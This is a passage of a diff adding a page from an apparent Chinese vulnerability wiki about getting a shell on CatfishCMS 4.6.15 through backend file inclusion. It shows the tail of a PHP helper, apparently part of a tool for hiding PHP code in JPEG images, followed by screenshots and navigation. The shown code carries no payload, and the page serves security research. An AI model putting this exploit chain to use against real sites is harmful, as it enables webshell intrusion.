+<span class="w">        </span><span class="k">if</span><span class="p">(</span><span class="n">preg_match</span><span class="p">(</span><span class="s1">&#39;/(\d+) extraneous bytes before marker/&#39;</span><span class="p">,</span><span class="w"> </span><span class="o">$</span><span class="n">errstr</span><span class="p">,</span><span class="w"> </span><span class="o">$</span><span class="n">m</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="k">if</span><span class="p">(</span><span class="n">isset</span><span class="p">(</span><span class="o">$</span><span class="n">m</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                </span><span class="o">$</span><span class="n">extraBytes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="nb nb-Type">int</span><span class="p">)</span><span class="o">$</span><span class="n">m</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
+<span class="w">            </span><span class="p">}</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="k">class</span><span class="w"> </span><span class="n">DataInputStream</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="n">private</span><span class="w"> </span><span class="o">$</span><span class="n">binData</span><span class="p">;</span>
+<span class="w">        </span><span class="n">private</span><span class="w"> </span><span class="o">$</span><span class="n">order</span><span class="p">;</span>
+<span class="w">        </span><span class="n">private</span><span class="w"> </span><span class="o">$</span><span class="n">size</span><span class="p">;</span>
+
+<span class="w">        </span><span class="n">public</span><span class="w"> </span><span class="n">function</span><span class="w"> </span><span class="n">__construct</span><span class="p">(</span><span class="o">$</span><span class="n">filename</span><span class="p">,</span><span class="w"> </span><span class="o">$</span><span class="n">order</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="bp">false</span><span class="p">,</span><span class="w"> </span><span class="o">$</span><span class="n">fromString</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="bp">false</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">binData</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="p">;</span>
+<span class="w">            </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">order</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">$</span><span class="n">order</span><span class="p">;</span>
+<span class="w">            </span><span class="k">if</span><span class="p">(</span><span class="o">!$</span><span class="n">fromString</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                </span><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">file_exists</span><span class="p">(</span><span class="o">$</span><span class="n">filename</span><span class="p">)</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="o">!</span><span class="n">is_file</span><span class="p">(</span><span class="o">$</span><span class="n">filename</span><span class="p">))</span>
+<span class="w">                    </span><span class="n">die</span><span class="p">(</span><span class="s1">&#39;File not exists [&#39;</span><span class="o">.$</span><span class="n">filename</span><span class="o">.</span><span class="s1">&#39;]&#39;</span><span class="p">);</span>
+<span class="w">                </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">binData</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">file_get_contents</span><span class="p">(</span><span class="o">$</span><span class="n">filename</span><span class="p">);</span>
+<span class="w">            </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">binData</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">$</span><span class="n">filename</span><span class="p">;</span>
+<span class="w">            </span><span class="p">}</span>
+<span class="w">            </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">size</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">strlen</span><span class="p">(</span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">binData</span><span class="p">);</span>
+<span class="w">        </span><span class="p">}</span>
+
+<span class="w">        </span><span class="n">public</span><span class="w"> </span><span class="n">function</span><span class="w"> </span><span class="n">seek</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="p">(</span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">size</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">strlen</span><span class="p">(</span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">binData</span><span class="p">));</span>
+<span class="w">        </span><span class="p">}</span>
+
+<span class="w">        </span><span class="n">public</span><span class="w"> </span><span class="n">function</span><span class="w"> </span><span class="n">skip</span><span class="p">(</span><span class="o">$</span><span class="n">skip</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">binData</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">substr</span><span class="p">(</span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">binData</span><span class="p">,</span><span class="w"> </span><span class="o">$</span><span class="n">skip</span><span class="p">);</span>
+<span class="w">        </span><span class="p">}</span>
+
+<span class="w">        </span><span class="n">public</span><span class="w"> </span><span class="n">function</span><span class="w"> </span><span class="n">readByte</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="k">if</span><span class="p">(</span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">eof</span><span class="p">())</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                </span><span class="n">die</span><span class="p">(</span><span class="s1">&#39;End Of File&#39;</span><span class="p">);</span>
+<span class="w">            </span><span class="p">}</span>
+<span class="w">            </span><span class="o">$</span><span class="n">byte</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">substr</span><span class="p">(</span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">binData</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">);</span>
+<span class="w">            </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">binData</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">substr</span><span class="p">(</span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">binData</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">);</span>
+<span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="n">ord</span><span class="p">(</span><span class="o">$</span><span class="n">byte</span><span class="p">);</span>
+<span class="w">        </span><span class="p">}</span>
+
+<span class="w">        </span><span class="n">public</span><span class="w"> </span><span class="n">function</span><span class="w"> </span><span class="n">readShort</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="k">if</span><span class="p">(</span><span class="n">strlen</span><span class="p">(</span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">binData</span><span class="p">)</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">2</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                </span><span class="n">die</span><span class="p">(</span><span class="s1">&#39;End Of File&#39;</span><span class="p">);</span>
+<span class="w">            </span><span class="p">}</span>
+<span class="w">            </span><span class="o">$</span><span class="n">short</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">substr</span><span class="p">(</span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">binData</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="mi">2</span><span class="p">);</span>
+<span class="w">            </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">binData</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">substr</span><span class="p">(</span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">binData</span><span class="p">,</span><span class="w"> </span><span class="mi">2</span><span class="p">);</span>
+<span class="w">            </span><span class="k">if</span><span class="p">(</span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">order</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                </span><span class="o">$</span><span class="n">short</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">ord</span><span class="p">(</span><span class="o">$</span><span class="n">short</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span><span class="w"> </span><span class="o">&lt;&lt;</span><span class="w"> </span><span class="mi">8</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">ord</span><span class="p">(</span><span class="o">$</span><span class="n">short</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
+<span class="w">            </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                </span><span class="o">$</span><span class="n">short</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">ord</span><span class="p">(</span><span class="o">$</span><span class="n">short</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span><span class="w"> </span><span class="o">&lt;&lt;</span><span class="w"> </span><span class="mi">8</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">ord</span><span class="p">(</span><span class="o">$</span><span class="n">short</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+<span class="w">            </span><span class="p">}</span>
+<span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="o">$</span><span class="n">short</span><span class="p">;</span>
+<span class="w">        </span><span class="p">}</span>
+
+<span class="w">        </span><span class="n">public</span><span class="w"> </span><span class="n">function</span><span class="w"> </span><span class="n">eof</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="o">!$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">binData</span><span class="o">||</span><span class="p">(</span><span class="n">strlen</span><span class="p">(</span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">binData</span><span class="p">)</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="mi">0</span><span class="p">);</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="err">?</span><span class="o">&gt;</span>
+</code></pre></div>
+
+<p><img alt="" src="../resource/CatfishCMS4.6.15%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABgetshell/media/rId37.png" /></p>
+<p><img alt="" src="../resource/CatfishCMS4.6.15%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABgetshell/media/rId38.png" /></p>
+<p><img alt="" src="../resource/CatfishCMS4.6.15%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABgetshell/media/rId39.png" /></p>
+<p><img alt="" src="../resource/CatfishCMS4.6.15%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABgetshell/media/rId40.png" /></p>
+<p><img alt="" src="../resource/CatfishCMS4.6.15%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABgetshell/media/rId41.png" /></p>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../CatfishCMS%E5%90%8E%E5%8F%B0csrf/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../CatfishCMS%E5%90%8E%E5%8F%B0csrf/" class="btn btn-xs btn-link">
+        CatfishCMS后台csrf
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../CatfishCMS%204.6.15%20%E5%89%8D%E5%8F%B0xss/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../CatfishCMS%204.6.15%20%E5%89%8D%E5%8F%B0xss/" class="btn btn-xs btn-link">
+        CatfishCMS 4.6.15 前台xss
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
